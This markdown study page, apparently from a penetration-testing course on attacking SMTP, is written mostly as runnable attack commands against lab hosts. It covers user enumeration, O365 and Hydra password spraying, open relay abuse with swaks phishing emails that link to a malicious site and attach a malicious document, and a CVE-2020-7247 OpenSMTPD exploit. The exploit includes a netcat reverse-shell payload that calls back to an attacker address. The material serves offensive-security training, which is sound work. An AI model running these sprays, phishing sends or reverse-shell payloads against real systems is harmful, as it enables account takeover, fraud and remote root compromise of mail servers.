---
tags: [attack, enumeration/smtp, attack/network]
module: attacking_common_services
last_updated: 2026-05-11
source_count: 2
---

# Attacking SMTP

SMTP attack techniques: user enumeration, password spraying, open relay abuse, and CVE-2020-7247 (OpenSMTPD RCE).

## Overview

SMTP (TCP/25) and submission ports (TCP/587, 465) are attack surfaces for user enumeration, phishing via open relay, and direct RCE in unpatched servers. User enumeration via SMTP is especially valuable because it produces a confirmed user list for subsequent credential attacks.

See [[enumeration/smtp]] for service fingerprinting and manual enumeration commands.

## User enumeration

### Manual VRFY / EXPN / RCPT TO

```bash
telnet 10.129.14.128 25

VRFY root              # verify if user exists
EXPN support           # expand alias or list
RCPT TO:<admin@inlanefreight.htb>  # attempt delivery — 550 = no user
```

### smtp-user-enum (automated)

```bash
smtp-user-enum -M VRFY -U users.txt -t 10.129.14.128
smtp-user-enum -M RCPT -U users.txt -D inlanefreight.htb -t 10.129.14.128
smtp-user-enum -M EXPN -U users.txt -t 10.129.14.128
```

`-M RCPT` is the most universally supported method; use it when VRFY is disabled.

## O365 user enumeration and password spraying

### o365spray

```bash
pip install o365spray

# Step 1 — validate the domain uses O365
python3 o365spray.py --validate --domain inlanefreight.com

# Step 2 — enumerate valid users
python3 o365spray.py --enum -U users.txt --domain inlanefreight.com

# Step 3 — password spray (BE CAREFUL: lockout risk)
python3 o365spray.py --spray -U valid_users.txt -P passwords.txt \
        --count 1 --lockout 1 --domain inlanefreight.com
```

`--count 1 --lockout 1` — spray 1 password then wait 1 minute; keeps below typical lockout threshold of 3-5 attempts.

## Password spraying with Hydra

```bash
# SMTP auth spray
hydra -L users.txt -p 'HTBRocks!' -f 10.129.14.128 smtp

# POP3 spray (for reading mail after gaining creds)
hydra -l fiona@inlanefreight.htb -P /usr/share/wordlists/rockyou.txt \
      -f 10.129.14.128 pop3
```

## Open relay testing and abuse

An open relay forwards email from any source to any destination — enabling phishing with a trusted domain's identity.

### Test for open relay

```bash
# nmap script
nmap -p25 --script smtp-open-relay -v 10.129.14.128

# Manual test — attempt external-to-external relay
telnet 10.129.14.128 25
EHLO attacker.com
MAIL FROM:<test@attacker.com>
RCPT TO:<victim@gmail.com>
# 250 OK = open relay
```

### Send phishing via swaks

```bash
swaks --from notifications@inlanefreight.com \
      --to employee@inlanefreight.htb \
      --header 'Subject: Password Reset Required' \
      --body 'Visit http://malicious.site to reset your password.' \
      --server 10.129.14.128
```

With an attachment:

```bash
swaks --from hr@inlanefreight.com \
      --to victim@inlanefreight.htb \
      --header 'Subject: Q2 Bonus' \
      --attach /tmp/malicious.doc \
      --server 10.129.14.128
```

## CVE-2020-7247 — OpenSMTPD ≤ 6.6.2 RCE

Command injection via the `MAIL FROM` sender field. A semicolon (`;`) breaks out of the address-recording function, and subsequent characters are executed as shell commands (limit: 64 characters total).

- No authentication required
- Runs with root privileges (SMTP listens on privileged port as root)
- Exploitable since 2018; CVE assigned January 2020
- [Exploit-DB 47984](https://www.exploit-db.com/exploits/47984)

```bash
# Manual proof-of-concept
telnet 10.129.14.128 25
HELO attacker.com
MAIL FROM:<;id;>

# 64-char reverse shell payload — pipe netcat to sh
MAIL FROM:<;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.15 4444>/tmp/f;>
```

Start listener before sending:

```bash
nc -lvnp 4444
```

## Gotchas & notes

- VRFY is disabled by default on many servers; try RCPT as primary method
- O365 enumeration can be noisy; Microsoft may throttle after repeated requests
- swaks is only useful if the target allows relaying; confirm via nmap script first
- CVE-2020-7247: the 64-char limit forces creative payloads; stage via curl or wget to a hosted script if the initial payload must do more

## Related pages

- [[enumeration/smtp]]
- [[tools/attack/hydra]]
- [[tools/enumeration/nmap]]
- [[attack/smb]] — captured SMTP credentials often reused on SMB

## Sources

- raw/attacking_common_services/smtp_attacking_email_services.md
- raw/attacking_common_services/smtp_latest_email_service_vulnerabilities.md
